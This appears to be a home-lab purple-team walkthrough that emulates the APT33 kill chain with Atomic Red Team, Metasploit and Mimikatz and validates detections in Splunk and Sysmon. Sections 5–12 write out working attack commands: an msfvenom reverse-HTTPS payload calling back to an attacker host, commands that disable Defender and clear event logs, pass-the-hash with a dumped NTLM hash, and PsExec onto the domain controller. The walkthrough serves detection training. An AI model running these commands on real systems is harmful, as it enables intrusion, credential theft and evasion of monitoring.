
# APT33 (Elfin) Attack Simulation — Home Lab Walkthrough

> **Type:** Red Team / Blue Team Simulation  
> **Framework:** MITRE ATT&CK® | Atomic Red Team  
> **Detection Stack:** Splunk Enterprise Security + Sysmon  
> **Difficulty:** Intermediate  
> **Domain:** `NightBaron.local`

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Lab Architecture](#2-lab-architecture)
3. [Threat Intelligence — Who is APT33?](#3-threat-intelligence--who-is-apt33)
4. [Environment Setup](#4-environment-setup)
5. [Phase 1 — Initial Access & Payload Delivery](#5-phase-1--initial-access--payload-delivery)
6. [Phase 2 — Execution (T1059.001)](#6-phase-2--execution-t1059001)
7. [Phase 3 — Persistence (T1053.005 / T1547.001)](#7-phase-3--persistence-t1053005--t1547001)
8. [Phase 4 — Defense Evasion](#8-phase-4--defense-evasion)
9. [Phase 5 — Discovery](#9-phase-5--discovery)
10. [Phase 6 — Credential Access (T1003.001)](#10-phase-6--credential-access-t1003001)
11. [Phase 7 — Lateral Movement (T1021.002)](#11-phase-7--lateral-movement-t1021002)
12. [Phase 8 — Collection & Exfiltration (T1560.001 / T1041)](#12-phase-8--collection--exfiltration-t1560001--t1041)
13. [Detection — Splunk ES & Sysmon Analysis](#13-detection--splunk-es--sysmon-analysis)
14. [MITRE ATT&CK Coverage Map](#14-mitre-attck-coverage-map)
15. [Key Takeaways](#15-key-takeaways)

---

## 1. Executive Summary

This report documents a full end-to-end adversary emulation of **APT33** (also known as *Elfin* or *Refined Kitten*), an Iranian state-sponsored threat actor known for targeting aerospace, defense, and energy organizations. The simulation was conducted in an isolated home lab using **Atomic Red Team (ART)** to reproduce APT33's known TTPs, with **Splunk Enterprise Security** and **Sysmon** serving as the detection and response layer.

The goal of this exercise was threefold:

- Reproduce APT33's kill chain from initial access through data exfiltration in a controlled environment
- Generate realistic telemetry that mirrors what a SOC analyst would see during an actual intrusion
- Validate detection coverage using custom Splunk SPL correlation searches mapped to MITRE ATT&CK

**Key findings:**

| Category | Result |
|---|---|
| Techniques Simulated | 15 MITRE ATT&CK techniques |
| Atomic Red Team Tests Run | 11 ART test executions |
| Splunk Alerts Triggered | 8 distinct detections |
| Credentials Successfully Dumped | ✅ NTLM hash extracted |
| Lateral Movement to DC | ✅ Successful via Pass-the-Hash |
| Exfiltration Simulated | ✅ via C2 channel |

---

## 2. Lab Architecture

The lab is built on VMware/VirtualBox and segmented into three network zones connected through a **PfSense** firewall/router.

<img width="1920" height="1080" alt="Attacker" src="https://github.com/user-attachments/assets/0a30d343-eb78-4514-b1ef-d955f9d6fd16" />


### Machine Inventory

| Machine | IP Address | OS | Role in Simulation |
|---|---|---|---|
| Kali Linux | `192.168.16.130` | Kali Linux 2024 | Attacker / C2 Server |
| Victim Machine | `192.168.10.50` | Windows 10 | Initial foothold — ART installed here |
| Domain Controller | `192.168.10.15` | Windows Server 2019 | Lateral movement target |
| Linux Server | `192.168.10.30` | Ubuntu 22.04 | Secondary target |
| Splunk ES (SIEM) | `192.168.20.65` | Ubuntu + Splunk 9.x | Detection & alerting |
| PfSense | Gateway | FreeBSD | Firewall / network segmentation |

> **Domain:** `NightBaron.local` | **NetBIOS:** `NIGHTBARON`

---

## 3. Threat Intelligence — Who is APT33?

APT33 is an Iranian cyber espionage group that has been active since at least 2013. Mandiant (formerly FireEye) first publicly attributed the group in 2017. The group primarily targets organizations in the **aerospace, aviation, energy, and petrochemical** sectors.

### Known Malware Arsenal

| Tool | Purpose |
|---|---|
| **DROPSHOT** (aka SHAPESHIFT) | Dropper / wiper |
| **TURNEDUP** | Custom backdoor / RAT |
| **NANOCORE** | Commercial RAT |
| **NETWIRE** | Commercial RAT |
| **PUPYRAT** | Open-source cross-platform RAT |
| **Mimikatz** | Credential dumping |

### APT33 Kill Chain (MITRE ATT&CK)

APT33 consistently follows this progression:

```
Spear-Phishing → PowerShell Execution → Persistence → Defense Evasion
      → Discovery → Credential Dumping → Lateral Movement → Exfiltration
```

---

## 4. Environment Setup

### 4.1 Installing Atomic Red Team — On the Victim Machine (192.168.10.50)

Atomic Red Team is installed directly on the Victim Machine. This represents the post-compromise phase — simulating all techniques an attacker would execute after gaining an initial foothold.

**Step 1 — Disable Windows Defender**

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
Add-MpPreference -ExclusionPath "C:\AtomicRedTeam"
Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
```

**Step 2 — Install Invoke-AtomicRedTeam**


**Step 3 — Verify Installation**


**Step 4 — Import the module**


### 4.2 Installing Sysmon : On Victim Machine and Domain Controller

Sysmon is critical. Without it, Splunk ES cannot capture process creation, network connections, or registry modifications that ART tests generate.

### 4.3 Splunk Universal Forwarder Configuration

Configure the forwarder on both Victim Machine and Domain Controller to send logs to the SIEM at `192.168.20.65`.

## 5. Phase 1 — Initial Access & Payload Delivery

**MITRE Technique:** T1566.001 — Spearphishing Attachment  
**MITRE Technique:** T1204.002 — User Execution: Malicious File  

APT33 is well documented for using spear-phishing emails with malicious links or macro documents to gain initial access. In this simulation, we replicate this by generating a reverse HTTPS payload and delivering it to the Victim Machine, simulating what happens when a target clicks a phishing link.

### Step 1 — Set Up C2 Listener on Kali (192.168.16.130)

```bash
msfconsole -q

use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST 192.168.16.130
set LPORT 443
set ExitOnSession false
exploit -j
```

### Step 2 — Generate the Phishing Payload

```bash
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=192.168.16.130 \
  LPORT=443 \
  -f exe \
  -o /var/www/html/update.exe

service apache2 start
```

### Step 3 — Payload Execution on Victim Machine (Simulating User Click)

<img width="797" height="72" alt="IWR payload Windows 10 Side" src="https://github.com/user-attachments/assets/2ca07c10-ada7-495a-adde-769d49a3d5ab" />


### Result

<img width="787" height="371" alt="Meterpreter Session Kali Side" src="https://github.com/user-attachments/assets/5c511534-791d-4476-827a-6fb2e1f0884c" />


> **Foothold established.** The attacker now has an interactive shell on the Victim Machine running as the `pc` user. All subsequent phases are executed from this position.

---

## 6. Phase 2 — Execution (T1059.001)

**MITRE Technique:** T1059.001 — Command and Scripting Interpreter: PowerShell

APT33 makes heavy use of PowerShell for downloading tools, executing encoded payloads, and running in-memory scripts. This avoids writing files to disk and evades many AV solutions.

**Available tests on this system:**

```
T1059.001-1   Mimikatz
T1059.001-3   Run Bloodhound from Memory using Download Cradle
T1059.001-10  PowerShell Fileless Script Execution
T1059.001-15  ATHPowerShellCommandLineParameter -EncodedCommand parameter variations
T1059.001-17  PowerShell Command Execution
```

### Test 1 — Download Cradle 

APT33's TURNEDUP backdoor uses download cradles to pull and execute tools directly in memory. This test simulates that behavior.

```powershell
Invoke-AtomicTest T1059.001 -TestNumbers 3
```

### Test 2 — Encoded Command Execution (Base64 Obfuscation)

APT33 heavily encodes their PowerShell commands to evade logging and signature detection.

```powershell
Invoke-AtomicTest T1059.001 -TestNumbers 15
```

### Test 3 — Fileless Script Execution

```powershell
Invoke-AtomicTest T1059.001 -TestNumbers 10
```

### Test 4 — General Command Execution Baseline

```powershell
Invoke-AtomicTest T1059.001 -TestNumbers 17
```

## 7. Phase 3 — Persistence (T1053.005 / T1547.001)

APT33 establishes persistence to survive reboots and maintain access even if the initial payload is killed. Their two primary methods are Scheduled Tasks and Registry Run Keys.

### 7.1 Scheduled Task Persistence — T1053.005

```
T1053.005-4   PowerShell Cmdlet Scheduled Task
```

**Test — PowerShell-based Scheduled Task**

```powershell
Invoke-AtomicTest T1053.005 -TestNumbers 4
```

### 7.2 Registry Run Key Persistence — T1547.001

```
T1547.001-1   Reg Key Run
T1547.001-3   PowerShell Registry RunOnce
T1547.001-9   SystemBC Malware-as-a-Service Registry
```

```powershell
Invoke-AtomicTest T1547.001 -TestNumbers 1

Invoke-AtomicTest T1547.001 -TestNumbers 3
```


## 8. Phase 4 — Defense Evasion

**MITRE Technique:** T1562.001 — Impair Defenses  
**MITRE Technique:** T1070.001 — Indicator Removal: Clear Windows Event Logs


### 8.1 Disable Security Tools

APT33 disables Windows Defender and stops event logging to operate without detection.

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableScriptScanning $true
Set-MpPreference -DisableIOAVProtection $true
```

### 8.2 Clear Windows Event Logs

```powershell
wevtutil cl Security
wevtutil cl System
wevtutil cl Application
```

## 9. Phase 5 — Discovery

**MITRE Techniques:** T1082, T1016, T1018

After gaining a foothold, APT33 performs systematic reconnaissance of the local machine and the network to identify targets for lateral movement.

```powershell

Invoke-AtomicTest T1082 -TestNumbers 1

Invoke-AtomicTest T1016 -TestNumbers 1

Invoke-AtomicTest T1018 -TestNumbers 1
```

**Key discovery findings in this lab:**

| Discovery | Result |
|---|---|
| Domain Name | `NightBaron.local` / `NIGHTBARON` |
| Domain Controller | `192.168.10.15` |
| Victim Machine | `NB-WIN-001` |
| Active User | `pc` (member of NIGHTBARON domain) |
| Other Hosts | `192.168.10.30` (Linux Server) |

---

## 10. Phase 6 — Credential Access (T1003.001)

**MITRE Technique:** T1003.001 — OS Credential Dumping: LSASS Memory

This is the pivotal phase. APT33 uses Mimikatz to extract credentials from LSASS memory. These credentials are then used to authenticate to other machines in the domain.

### 10.1 Running the ART Test

```powershell
Invoke-AtomicTest T1003.001 -TestNumbers 2
```

### 10.2 Extracted Credentials — Summary

| Account | Type | NTLM Hash | Plaintext | Usable |
|---|---|---|---|---|
| `pc` | Local user | `a47cc8e930890eb79fb768a519cd3e57` | `(null)` |  via PtH |
| `NB-WIN-001$` | Machine account | `644b6f9f5e4bd15ad497392d2ac9a2c7` | Auto-generated |  Limited |

> **Why is the password `(null)`?**  
> WDigest authentication has been disabled by default since Windows 8.1 and Windows Server 2012 R2. This means plaintext passwords are not cached in LSASS. However, **NTLM hashes are still extracted** and can be used directly for Pass-the-Hash attacks without needing to crack them.


## 11. Phase 7 — Lateral Movement (T1021.002)

**MITRE Technique:** T1021.002 — Remote Services: SMB/Windows Admin Shares

With the NTLM hash of user `pc` extracted, we perform **Pass-the-Hash** to move laterally to the Domain Controller at `192.168.10.15`. `net use` requires a plaintext password, so we use Mimikatz `sekurlsa::pth` to spawn an authenticated shell.

### 11.1 Pass-the-Hash via Mimikatz

```cmd
privilege::debug

sekurlsa::pth /user:pc /domain:NIGHTBARON /ntlm:a47cc8e930890eb79fb768a519cd3e57 /run:cmd.exe
```

A new `cmd.exe` window opens, pre-authenticated as `NIGHTBARON\pc` using the hash — **no plaintext password needed.**

### 11.2 Accessing the Domain Controller via SMB

```cmd

net use \\192.168.10.15\ADMIN$ /u:NIGHTBARON\pc


dir \\192.168.10.15\ADMIN$
dir \\192.168.10.15\C$
```

### 11.3 ART Lateral Movement Test

```powershell
Invoke-AtomicTest T1021.002 -TestNumbers 1
```

### 11.4 Remote Code Execution on DC via PsExec (Meterpreter)

```bash
use exploit/windows/smb/psexec
set RHOSTS 192.168.10.15
set SMBUser pc
set SMBDomain NIGHTBARON
set SMBPass aad3b435b51404eeaad3b435b51404ee:a47cc8e930890eb79fb768a519cd3e57
set payload windows/x64/meterpreter/reverse_https
set LHOST 192.168.16.130
exploit
```

> **Domain Controller compromised.** The attacker now has SYSTEM-level access on the most privileged machine in the domain.
---

## 12. Phase 8 — Exfiltration (T1560.001 / T1041)
  
**MITRE Technique:** T1071 — Exfiltration Over HTPPS

From the Domain Controller, APT33 collects sensitive files, compresses them, and exfiltrates them back to the attacker-controlled C2.


```powershell
Invoke-AtomicTest T1071.001 -TestNumbers 1
```

### 12.4 Post-Simulation Cleanup

```powershell
Invoke-AtomicTest T1053.005 -TestNumbers 4 -Cleanup
Invoke-AtomicTest T1547.001 -TestNumbers 1 -Cleanup
Invoke-AtomicTest T1003.001 -TestNumbers 2 -Cleanup
```

## 13. Detection — Splunk ES & Sysmon Analysis

All detections were validated in **Splunk Enterprise Security** at `192.168.20.65`. Each query below maps to a specific technique and the Sysmon/Windows Event ID that triggers it.

> **Prerequisites:** `index=sysmon` for Sysmon logs, `index=wineventlog` for Windows Security/System logs.

---

### Detection 1 — Suspicious PowerShell Encoded Command

**Triggers on:** T1059.001 tests 3, 10, 15, 1  


<img width="1687" height="122" alt="exec of update executable" src="https://github.com/user-attachments/assets/b870499b-6824-4e5c-bacd-34c4a913767d" />


This is the initial Meterpreter reverse shell beacon. The payload update.exe, delivered via the simulated phishing link, immediately connected back to the attacker's C2 listener on port 443.


<img width="1680" height="465" alt="exec of T1059 001 3" src="https://github.com/user-attachments/assets/002d493e-7f94-4af8-9732-7b36de0ba85f" />


This event corresponds to ART test T1059.001-3. PowerShell downloads SharpHound directly from GitHub into memory using IEX + DownloadString without ever writing the script to disk. Tools are loaded and executed entirely in memory, leaving minimal forensic artifacts on the file system. 


<img width="1690" height="172" alt="Exec of T1059 001 15" src="https://github.com/user-attachments/assets/ea5d0962-824b-4cb5-8f59-7eccfd5b5caf" />


This is ART test T1059.001-15, which exercises multiple variations of the -EncodedCommand flag (-E, -En, -Enc, -Enco, etc.) that attackers use to evade simple string-matching rules that only look for the full -EncodedCommand keyword. The Base64 blob is visible in the raw command line.



<img width="1687" height="97" alt="Exec of T1059 001 1" src="https://github.com/user-attachments/assets/ec560a7d-c4e9-4b66-98f9-a68e516bbad0" />



This is ART test T1059.001-1: Mimikatz is pulled directly from the PowerSploit GitHub repository into memory and executed without writing any binary to disk. This event bridges the Execution phase and the Credential Access phase




### Detection 2 — LSASS Memory Access (Credential Dump)

**Triggers on:** T1003.001 — Mimikatz / comsvcs.dll dump  



<img width="1687" height="527" alt="Exec of T1003 001 2 Correlation" src="https://github.com/user-attachments/assets/ceda273f-6b8d-4574-9017-ac1474548993" />



The timeline highlights multiple correlated events collected through Sysmon logs and analyzed in Splunk. The detection begins with reconnaissance activity (whoami.exe), followed by the execution of powershell.exe, which launches rundll32.exe with comsvcs.dll to invoke the MiniDump function against the LSASS process. The command line parameters clearly show the creation of a dump file named lsass-comsvcs.dmp within the user’s temporary directory.



---

### Detection 3 — Scheduled Task Created via PowerShell

**Triggers on:** T1053.005-4 


<img width="1546" height="306" alt="Exec of T1053 005 4 SchTask" src="https://github.com/user-attachments/assets/74efad5e-4aa8-4d45-a18f-2f61155d5f3b" />


This sysmon event shows the execution of powershell.exe using PowerShell cmdlets including New-ScheduledTaskAction, New-ScheduledTaskTrigger, and Register-ScheduledTask. The command creates a scheduled task configured to execute calc.exe at user logon with elevated privileges (RunLevel Highest) under the built-in Administrators group.

This behavior demonstrates how attackers can establish persistence on a compromised system by registering scheduled tasks that automatically execute malicious payloads after reboot or user authentication.


### Detection 4 — Registry Run Key Modification

**Triggers on:** T1547.001-1, T1547.001-3  


```spl
index=sysmon EventCode=13
  (TargetObject="*\\CurrentVersion\\Run*"
   OR TargetObject="*\\CurrentVersion\\RunOnce*"
   OR TargetObject="*\\CurrentVersion\\RunOnceEx*")
| table _time, ComputerName, User, Image, TargetObject, Details
| sort -_time
```
<img width="1697" height="272" alt="Exec of T1547 001 1 Registry Run Key Modif" src="https://github.com/user-attachments/assets/aa6e4e06-2d9a-4ff5-b3d7-b669be7f9773" />

This query monitors changes made to registry paths associated with automatic program execution during system startup or user logon, including Run, RunOnce, and RunOnceEx registry keys. 
The captured events show suspicious modifications performed through both powershell.exe and reg.exe, including the addition of commands designed to execute PowerShell in hidden mode and download remote content from an external source.


<img width="1680" height="80" alt="Exec of T1547 001 3" src="https://github.com/user-attachments/assets/cc43050e-8f18-444b-9d61-02627db027ea" />


This event demonstrates the registration of the Atomic Red Team executable within a Run key, simulating persistence behavior.
These registry modifications allow malicious payloads to survive system reboots and maintain long-term access to the compromised host.




### Detection 5 — Windows Event Log Cleared

**Triggers on:** Manual / T1070.001   
**Windows Event:** ID 1102 (Security), ID 104 (System)


<img width="1561" height="501" alt="Exec of T1070 001 Clear Logs" src="https://github.com/user-attachments/assets/3f24fcf6-52e2-48b4-8d35-093202731084" />


The above screenshot shows three log clearance events detected, all three events occurred within a one‑minute window. This rapid succession of log deletions is highly indicative of adversary behavior attempting to hinder forensic analysis and cover tracks after executing other malicious actions.


## 14. MITRE ATT&CK Coverage Map

| # | Technique ID | Name | Phase | Test Method | Detected |
|---|---|---|---|---|---|
| 1 | T1566.001 | Spearphishing Attachment | Initial Access | Manual (msfvenom) | ✅ |
| 2 | T1204.002 | Malicious File Execution | Execution | Manual (IWR + Start-Process) | ✅ |
| 3 | T1059.001 | PowerShell | Execution | ART #3, #10, #15, #17 | ✅ |
| 4 | T1053.005 | Scheduled Task | Persistence | ART #4, #7 | ✅ |
| 5 | T1547.001 | Registry Run Keys | Persistence | ART #1, #3 | ✅ |
| 6 | T1562.001 | Disable Security Tools | Defense Evasion | Manual | ✅ |
| 7 | T1070.001 | Clear Windows Event Logs | Defense Evasion | Manual (wevtutil) | ✅ |
| 8 | T1082 | System Information Discovery | Discovery | ART #1 | ✅ |
| 9 | T1016 | Network Config Discovery | Discovery | ART #1 | ✅ |
| 10 | T1018 | Remote System Discovery | Discovery | ART #1 | ✅ |
| 11 | T1003.001 | LSASS Memory Dump | Credential Access | ART #1, #2 + Mimikatz | ✅ |
| 12 | T1021.002 | SMB Admin Shares | Lateral Movement | ART #1 + Manual PtH | ⚠️ |
| 13 | T1560.001 | Archive Collected Data | Collection | ART #1 | ⚠️ |
| 14 | T1041 | Exfil Over C2 | Exfiltration | ART #1 + Meterpreter | ⚠️ |
| 15 | T1071.001 | Web Protocols (HTTPS C2) | C2 | ART #1 + Manual beacon | ⚠️ |

> ✅ Detected in Splunk ES | ⚠️ Telemetry generated, detection rule needed

---


## References

- [MITRE ATT&CK — APT33 (G0064)](https://attack.mitre.org/groups/G0064/)
- [Mandiant — APT33 Profile](https://www.mandiant.com/resources/apt33-insights-into-iranian-cyber-espionage)
- [Invoke-AtomicRedTeam GitHub](https://github.com/redcanaryco/invoke-atomicredteam)
- [Atomic Red Team Atomics Library](https://github.com/redcanaryco/atomic-red-team)
- [SwiftOnSecurity Sysmon Config](https://github.com/SwiftOnSecurity/sysmon-config)
- [Splunk Security Essentials](https://splunkbase.splunk.com/app/3435)
- [MITRE ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/)

---


